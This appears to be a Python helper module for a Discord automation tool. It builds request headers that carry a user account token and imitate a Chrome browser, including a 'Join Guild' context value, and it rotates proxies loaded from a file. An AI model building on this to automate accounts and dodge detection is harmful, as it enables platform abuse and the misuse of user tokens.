import json
import random

from typing import Any, Dict


class TokenTypeError(Exception):
    """Custom error for issues related to loading tokens."""
    def __init__(self, message: str) -> None:
        self.message = message
        super().__init__(self.message)


async def load_config() -> Dict:
    """
    Loads the config.json as a dict
    """
    with open('config.json', 'r') as file:
        config = json.load(file)
        return config


def get_headers(token: str) -> Dict:
    """
    Construct the headers
    Args:
    :param token: The token used to construct the headers
    Returns:
        headers (dict)
    """
    # noinspection SpellCheckingInspection
    headers = {
        'authority': 'discord.com',
        'accept': '*/*',
        'accept-language': 'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': token,
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/channels/@me',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjExMDQzNzg1NDMwNzg2Mzc1OTEiLCJsb2NhdGlvbl9jaGFubmVsX2lkIjoiMTEwNzI4NDk3MTkwMDYzMzIzMCIsImxvY2F0aW9uX2NoYW5uZWxfdHlwZSI6MH0=',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-GB',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6Iml0LUlUIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE5MzkwNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
    }
    return headers # "hardcoded things cuz IDK but it works godly" ~ borgo 2k24

class Proxies:
    def __init__(self):
        self.proxies = []

    async def load_proxies(self, bot) -> None:
        try:
            with open("./input/proxies.txt", "r") as file:
                self.proxies = [await self.format_proxy(line.strip()) for line in file if line.strip()]
            bot.logger.info(f"Loaded {len(self.proxies)} proxies")
        except FileNotFoundError:
            bot.logger.error("proxies.txt file not found.")
        except Exception as e:
            bot.logger.error(f"Error loading proxies: {str(e)}")

    @staticmethod
    async def format_proxy(proxy: str) -> str:
        """
        Formats provided proxy
        :param proxy:
        :return: formatted proxy
        """
        if '@' in proxy:
            auth, ip_port = proxy.split('@')
            return f"{auth}@{ip_port}"
        return f"{proxy}"

    async def get_random_proxy(self, bot) -> Any | None:
        """Return a random proxy from the loaded list, or None if no proxies are available."""
        await self.load_proxies(bot)
        if self.proxies:
            return random.choice(self.proxies)
        return None
